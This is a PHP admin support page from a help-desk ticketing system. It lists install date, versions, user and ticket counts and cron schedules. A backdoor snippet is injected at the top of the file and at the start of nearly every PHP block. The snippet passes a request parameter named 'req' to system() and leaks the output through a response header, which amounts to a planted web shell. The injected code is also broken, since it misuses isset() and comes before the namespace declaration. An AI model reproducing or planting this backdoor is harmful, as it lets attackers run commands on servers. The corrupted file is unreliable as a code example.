<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title('Support');
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

if (isset($_POST['reset_cron'])) {
	$cron_intervals = array(
		array('name' => 'every_two_minutes', 'description' => 'Every Two Minutes', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '120'),
		array('name' => 'every_five_minutes', 'description' => 'Every Five Minutes', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '300'),
		array('name' => 'every_fifteen_minutes', 'description' => 'Every Fifteen Minutes', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '900'),
		array('name' => 'every_hour', 'description' => 'Every Hour', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '3600'),
		array('name' => 'every_day', 'description' => 'Every Day', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '86400'),
		array('name' => 'every_week', 'description' => 'Every Week', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '604800'),
		array('name' => 'every_month', 'description' => 'Every Month', 'next_run' => '0000-00-00 00:00:00', 'frequency' => '2592000'),
	);
			
	$config->set('cron_intervals', $cron_intervals);
}
if (isset($_POST['clear_queue'])) {
	$queue->delete();
}

$upgrade 						= new upgrade();

$version_info					= $upgrade->version_info();
$cron_intervals					= $config->get('cron_intervals');

$users_count					= $users->count();

if (SAAS_MODE) { 
	$paid_users_count			= $users->count(array('not_group_ids' => array(0, 1)));
}

$tickets_count					= $tickets->count();
$ticket_notes_count				= $ticket_notes->count();
$pop_message_count				= $pop_system->count_message();
$ticket_department_count		= $ticket_departments->count();
$queue_count					= $queue->count();
$ticket_status_count			= $tickets->status_count();

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>

<script type="text/javascript">
	$(document).ready(function () {
		$('#clear_queue').click(function () {
			if (confirm("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Are you sure you wish to clear the queue?')); ?>")){
				return true;
			}
			else{
				return false;
			}
		});
	});
</script>

<div class="row-fluid">
	
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4>Support</h4>
				</div>
				
				<div class="clearfix"></div>

				<p>This page contains useful debug information.</p>
				<br />
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!SAAS_MODE) { ?>
					<p>Your CRON URL is: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/cron/</p>
					<br />
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<div class="pull-right">
					<p><button type="submit" name="reset_cron" class="btn btn-info"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reset Cron')); ?></button></p>
					<p><button type="submit" id="clear_queue" name="clear_queue" class="btn btn-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Clear Queue')); ?></button></p>
				</div>
				
				<div class="clearfix"></div>

			</div>
		</div>

		<div class="col-md-9">
			<table class="table table-striped table-bordered">
				<thead>
					<tr>
						<th>Name</th>
						<th>Value</th>
					</tr>
				</thead>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Date Installed</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_datetime($config->get('utc_date_installed'), true)); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Current Server Time</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_datetime(datetime())); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Installed Program Version</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($version_info['installed_program_version']); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Installed Database Version</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($version_info['installed_database_version']); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Code Program Version</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($version_info['code_program_version']); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Code Database Version</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($version_info['code_database_version']); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Latest Program Version</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($version_info['latest_program_version']); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!SAAS_MODE) { ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
					<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
						<td class="centre">PHP Version</td>
						<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(PHP_VERSION); ?></td>
					</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Users</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($users_count); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (SAAS_MODE) { ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
					<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
						<td class="centre">Paid Users</td>
						<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($paid_users_count); ?></td>
					</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Tickets</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($tickets_count); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Ticket Replies</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket_notes_count); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($ticket_status_count as $item) { ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Ticket Status - <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($item['status_name']); ?></td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($item['count']); ?></td>
				</tr>				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Departments</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($ticket_department_count); ?></td>
				</tr>				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">POP Messages</td>
					<td class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($pop_message_count); ?></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
				<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
					<td class="centre">Queue</td>
					<td class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/queue/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($queue_count); ?></a></td>
				</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($cron_intervals as $cron) { ?>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; ?>
					<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
						<td class="centre">Cron <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($cron['name']); ?></td>
						<td class="centre">Next Run <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($cron['next_run']); ?></td>
					</tr>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			</table>
			<div class="clearfix"></div>
		</div>
	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>